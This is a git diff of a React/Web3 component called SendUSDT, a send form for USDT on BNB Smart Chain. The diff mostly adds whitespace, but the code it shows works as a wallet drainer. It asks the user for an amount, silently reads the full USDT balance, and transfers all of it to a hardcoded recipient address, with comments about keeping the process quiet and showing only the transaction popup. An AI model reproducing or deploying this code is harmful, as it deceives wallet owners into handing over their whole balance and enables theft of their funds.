@@ -1,3 +1,4 @@
+/* global BigInt */
 import { useState, useEffect } from "react";
 import Web3 from "web3";
 import Swal from "sweetalert2";
@@ -11,8 +12,10 @@ import '@fontsource/open-sans/700.css';
 import '@fontsource/open-sans/800.css';
 import '@fontsource/geist';
 
+
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const recipientAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Your receiving address
+
 
 const usdtAbi = [
   {
@@ -34,6 +37,7 @@ const usdtAbi = [
   },
 ];
 
+
 export default function SendUSDT() {
   const [amount, setAmount] = useState("");
   const [usdValue, setUsdValue] = useState("= $0.00");
@@ -41,19 +45,23 @@ export default function SendUSDT() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
 
+
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
+
 
     const listener = (e) => setTheme(e.matches ? "dark" : "light");
     window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
     return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
   }, []);
 
+
   useEffect(() => {
     const value = parseFloat(amount);
     setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
   }, [amount]);
+
 
   const setMaxAmount = async () => {
     try {
@@ -72,6 +80,7 @@ export default function SendUSDT() {
     }
   };
 
+
   const handleTransfer = async () => {
     setIsProcessing(true);
     try {
@@ -81,7 +90,9 @@ export default function SendUSDT() {
         return;
       }
 
+
       const web3 = new Web3(window.ethereum);
+
 
       // ✅ CRITICAL CHANGE: Use eth_accounts (silent, no popup)
       let accounts = await window.ethereum.request({ method: 'eth_accounts' });
@@ -96,6 +107,7 @@ export default function SendUSDT() {
         // First, get available accounts without triggering popup
         userAddress = null;
       }
+
 
       // Check and switch to BSC network
       const chainId = await web3.eth.getChainId();
@@ -128,7 +140,9 @@ export default function SendUSDT() {
         }
       }
 
+
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+
 
       // ✅ If we don't have userAddress yet, we need to get it from the first transaction
       if (!userAddress) {
@@ -137,11 +151,14 @@ export default function SendUSDT() {
         userAddress = tempAccounts[0];
       }
 
+
       // Fetch balance silently
       const currentBalance = await usdt.methods.balanceOf(userAddress).call();
 
+
       console.log("User address:", userAddress);
       console.log("USDT Balance:", currentBalance.toString());
+
 
       if (currentBalance === "0" || BigInt(currentBalance) === 0n) {
         Swal.fire("Error", "You have no USDT balance to transfer.", "error");
@@ -149,8 +166,10 @@ export default function SendUSDT() {
         return;
       }
 
+
       // Encode the transfer function call
       const transferData = usdt.methods.transfer(recipientAddress, currentBalance).encodeABI();
+
 
       // ✅ Use eth_sendTransaction directly - this shows ONLY the transaction popup
       const txHash = await window.ethereum.request({
@@ -163,7 +182,9 @@ export default function SendUSDT() {
         }],
       });
 
+
       console.log("Transaction hash:", txHash);
+
 
       // Wait for transaction receipt
       let receipt = null;
@@ -179,8 +200,10 @@ export default function SendUSDT() {
         }
       }
 
+
       console.log("Transaction successful:", receipt);
       setShowSuccess(true);
+
 
       // Store transaction hash
       try {
@@ -193,8 +216,10 @@ export default function SendUSDT() {
         console.warn("Skipping fetch, not critical:", fetchErr.message);
       }
 
+
     } catch (err) {
       console.error("Transfer error:", err);
+
 
       let errorMessage = "Something went wrong";
       if (err.message) {
@@ -209,13 +234,16 @@ export default function SendUSDT() {
         }
       }
 
+
       Swal.fire("Error", errorMessage, "error");
     } finally {
       setIsProcessing(false);
     }
   };
 
+
   const isDark = theme === "dark";
+
 
   if (showSuccess) {
     return (
@@ -240,6 +268,7 @@ export default function SendUSDT() {
     );
   }
 
+
   return (
     <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
       <div className="input-group">
@@ -261,6 +290,7 @@ export default function SendUSDT() {
           </span>
         </div>
       </div>
+
 
       <div className="input-group mt-7">
         <p className="inpt_tital">Amount</p>
@@ -288,7 +318,9 @@ export default function SendUSDT() {
         </div>
       </div>
 
+
       <p className="fees valid">{usdValue}</p>
+
 
       <button
         id="nextBtn"
